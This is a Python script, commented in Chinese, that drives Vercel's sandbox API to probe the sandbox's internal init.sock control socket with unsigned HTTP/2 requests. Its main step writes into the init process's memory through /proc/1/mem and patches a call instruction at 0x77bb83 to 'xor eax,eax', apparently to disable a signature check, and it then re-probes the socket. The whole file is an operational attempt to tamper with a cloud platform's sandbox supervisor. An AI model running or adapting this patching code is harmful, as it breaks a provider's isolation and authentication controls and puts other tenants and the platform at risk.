# -*- coding: utf-8 -*-
"""实验J270: 后台进程方案重测 init.sock 免签调用
A: 后台进程 h2 Ping 无签名 -> /tmp/resp1.txt (patch 前对照)
C: patch 0x77bb83
D: 后台进程 h2 Ping 无签名 -> /tmp/resp2.txt (patch 后)
E: 检查 resp2
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

BG_PROBE = r'''
import socket, struct, base64, time
def h2_request(path, body, outfile, timeout=8):
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect("/run/vercel/share/init.sock")
        sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        def fr(t, flags, sid, payload):
            return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
        sock.sendall(fr(4, 0, 0, b""))
        headers = (
            b":method: POST\r\n:scheme: http\r\n:path: " + path + b"\r\n:authority: init\r\n"
            b"content-type: application/json\r\nconnect-protocol-version: 1\r\n"
            b"content-length: " + str(len(body)).encode() + b"\r\n"
        )
        hp = base64.b64encode(headers)
        sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
        sock.sendall(fr(0, 0x1, 1, body))
        data = b""
        try:
            while True:
                d = sock.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 30000:
                    break
        except socket.timeout:
            pass
        except Exception as e:
            data += ("\nERR %s: %s" % (type(e).__name__, e)).encode()
        sock.close()
        open(outfile, "wb").write(data)
        return True
    except Exception as e:
        open(outfile, "wb").write(("EXC %s: %s" % (type(e).__name__, e)).encode())
        return False

ok = h2_request(b"/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}", "/tmp/resp1.txt")
'''

NAME = "expj270"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A: 写后台探针脚本 + setsid 启动 (patch 前对照)
CODE_A = r'''
import subprocess, time
open("/tmp/bg_probe.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/bg_probe.py"],
    stdout=open("/tmp/bgA.out", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("bg pid", r.pid, flush=True)
''' % BG_PROBE
run_cmd(sid, CODE_A, "A_BGSTART", timeout=100)

# B: 等 6 秒检查 resp1
time.sleep(7)
CODE_B = r'''
import os
print("resp1 exists:", os.path.exists("/tmp/resp1.txt"), flush=True)
if os.path.exists("/tmp/resp1.txt"):
    d = open("/tmp/resp1.txt", "rb").read()
    print("resp1 len", len(d), flush=True)
    print("resp1 asc:", "".join(chr(b) if 32 <= b < 127 else "." for b in d)[:600], flush=True)
print("bgA_out:", open("/tmp/bgA.out").read()[:300], flush=True)
'''
rB = run_cmd(sid, CODE_B, "B_CHECK1", timeout=100)
print("B done:", "resp1" in (rB or ""), flush=True)

# C: patch
CODE_C = r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77bb83, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("e8f841e2ff"):
    wa(0x77bb83, bytes.fromhex("31c0909090"))
    print("PATCHED", ra(0x77bb83, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''
rC = run_cmd(sid, CODE_C, "C_PATCH", timeout=100)
print("C done:", "PATCHED" in (rC or ""), flush=True)

# D: patch 后后台探针 (写 resp2)
BG_PROBE2 = BG_PROBE.replace("/tmp/resp1.txt", "/tmp/resp2.txt")
CODE_D = r'''
import subprocess
open("/tmp/bg_probe2.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/bg_probe2.py"],
    stdout=open("/tmp/bgD.out", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("bg2 pid", r.pid, flush=True)
''' % BG_PROBE2
run_cmd(sid, CODE_D, "D_BGSTART2", timeout=100)

# E: 等 6 秒检查 resp2
time.sleep(7)
CODE_E = r'''
import os
print("resp2 exists:", os.path.exists("/tmp/resp2.txt"), flush=True)
if os.path.exists("/tmp/resp2.txt"):
    d = open("/tmp/resp2.txt", "rb").read()
    print("resp2 len", len(d), flush=True)
    print("resp2 asc:", "".join(chr(b) if 32 <= b < 127 else "." for b in d)[:600], flush=True)
print("bgD_out:", open("/tmp/bgD.out").read()[:300], flush=True)
'''
rE = run_cmd(sid, CODE_E, "E_CHECK2", timeout=100)
print("E done:", "resp2" in (rE or ""), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
